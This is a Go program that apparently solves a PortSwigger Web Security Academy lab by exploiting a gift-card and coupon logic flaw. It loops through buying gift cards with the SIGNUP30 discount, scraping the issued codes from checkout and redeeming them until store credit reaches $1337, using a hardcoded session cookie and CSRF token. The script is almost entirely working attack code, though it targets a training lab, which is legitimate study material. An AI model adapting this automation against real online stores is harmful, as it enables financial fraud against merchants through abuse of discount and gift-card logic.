package main

import (
	"fmt"
	"io"
	"log"
	"math"
	"net/http"
	"net/url"
	"strconv"
	"strings"

	"github.com/PuerkitoBio/goquery"
)

// required configuration - make sure you have at least $10 of store credit
const (
	baseURL = "https://acb81f601fca3cc3809b0e5000d900a0.web-security-academy.net/"
	// baseURL := "https://acb81f601fca3cc3809b0e5000d900a0.free.beeceptor.com/" // for debugging
	csrf          = "LCEepui73UVECHlN3R84TDYwCdfXc5cX"         // get this info from a POST request to /cart/coupon using Burp
	cookie        = "session=ZrqCi4oh69dHpHLsSdUv072OJNOfw8Sf" // get this info from a POST request to /cart/coupon using Burp
	targetBalance = 1337
)

type httpObject struct {
	Path   string
	Method string
	Params map[string]string
}

func httpReq(Method string, urlpath string, params map[string]string) (*http.Response, error) {
	client := &http.Client{}

	form := url.Values{}
	if Method == "POST" {
		for k, v := range params {
			form.Set(k, v)
		}
	}

	req, err := http.NewRequest(Method, urlpath, strings.NewReader(form.Encode()))
	if err != nil {
		return nil, err
	}

	req.Header.Add("User-Agent", "Hacker Browser/1.0")
	req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Add("Content-Length", strconv.Itoa(len(form.Encode())))
	req.Header.Add("Cookie", cookie)

	// Print Request
	// reqDump, err := httputil.DumpRequest(req, true)
	// if err != nil {
	// 	return nil, err
	// }
	// fmt.Println(string(reqDump))

	resp, err := client.Do(req)

	// Print Response
	// respDump, err := httputil.DumpResponse(resp, true)
	// if err != nil {
	// 	return nil, err
	// }
	// fmt.Println(string(respDump))

	return resp, err
}

func redeem(coupon string) (*http.Response, error) {
	u := &httpObject{
		Path:   "gift-card",
		Method: "POST",
		Params: map[string]string{
			"csrf":      csrf,
			"gift-card": coupon,
		},
	}
	fmt.Printf("\n=== Request %s %s | coupon: %s\n", u.Method, u.Path, coupon)

	return httpReq(u.Method, baseURL+u.Path, u.Params)
}

func exploit(quantity int) {
	coupons := []string{}
	couponIndex := 0

	// https://ac4e1f8c1e904432803d30b300350046.web-security-academy.net/cart
	// https://ac4e1f8c1e904432803d30b300350046.web-security-academy.net/cart/coupon
	// https://ac4e1f8c1e904432803d30b300350046.web-security-academy.net/cart/checkout
	// https://ac4e1f8c1e904432803d30b300350046.web-security-academy.net/gift-card
	urls := []httpObject{
		{
			Path:   "cart",
			Method: "POST",
			Params: map[string]string{
				"productId": "2",
				"quantity":  strconv.Itoa(quantity),
				"redir":     "CART",
			},
		},
		{
			Path:   "cart/coupon",
			Method: "POST",
			Params: map[string]string{
				"csrf":   csrf,
				"coupon": "SIGNUP30",
			},
		},
		{
			Path:   "cart/checkout",
			Method: "POST",
			Params: map[string]string{
				"csrf": csrf,
			},
		},
	}

	for _, u := range urls {

		fmt.Printf("\n=== Request %s %s\n", u.Method, u.Path)
		resp, err := httpReq(u.Method, baseURL+u.Path, u.Params)

		if err != nil {
			fmt.Println("error: ", err)
			break
		}

		// save coupon code
		if u.Path == "cart/checkout" {
			defer resp.Body.Close()
			if resp.StatusCode == 200 {
				// Load and Scrape the HTML document
				doc, err := goquery.NewDocumentFromReader(resp.Body)
				if err != nil {
					log.Fatal(err)
				}

				// Find the coupon items
				doc.Find("table.is-table-numbers").Each(func(i int, tablehtml *goquery.Selection) {
					tablehtml.Find("tr").Each(func(indextr int, rowhtml *goquery.Selection) {
						rowhtml.Find("td").Each(func(indexth int, tablecell *goquery.Selection) {
							coupon := tablecell.Text()
							// fmt.Printf("Coupon %d: %s\n", indextr, coupon) // display coupon for debug
							coupons = append(coupons, coupon)
						})
					})
				})
			}
		}
		fmt.Println("status: ", resp.Status)
	}

	// redeem coupons
	for _, coupon := range coupons {
		resp, err := redeem(coupon)
		if err != nil {
			fmt.Println("error: ", err)
		}
		couponIndex++
		fmt.Println("status: ", resp.Status)
	}
}

func getCurrentStoreCredit() float64 {
	resp, err := httpReq("GET", baseURL+"my-account?id=wiener", nil)
	if err != nil {
		log.Fatal(err)
	}
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		log.Fatal(err)
	}
	resp.Body.Close()

	strChunk := strings.Split(string(body), "Store credit: $")
	if len(strChunk) < 2 {
		log.Fatal("could not fetch current balance - please check url, headers, cookies and current balance")
	}
	strChunk2 := strings.Split(strChunk[1], "</strong></p>")
	balanceString := strChunk2[0]

	balance, err := strconv.ParseFloat(balanceString, 64)
	if err != nil {
		log.Fatalf("could not convert current [%v] balance to float: %v", balance, err)
	}
	return balance
}

func main() {
	priceItemToBuy := 10
	for storeCredit := getCurrentStoreCredit(); targetBalance > storeCredit; storeCredit = getCurrentStoreCredit() {
		// display current balance and the amount of gift cards to buy
		fmt.Printf("\n\n==================================\n")
		fmt.Println("==> Current Store Credit: $", storeCredit)
		qty := int(math.Floor(storeCredit / float64(priceItemToBuy)))
		if qty > 99 {
			qty = 99 // this is the maximum value supported by the website
		}
		fmt.Printf("=> Buying %d gift cards to redeem.", qty)
		fmt.Printf("\n==================================\n\n")

		// execute the requests
		exploit(qty)
	}
	fmt.Println("Finished executing, current balance: $", getCurrentStoreCredit())
}
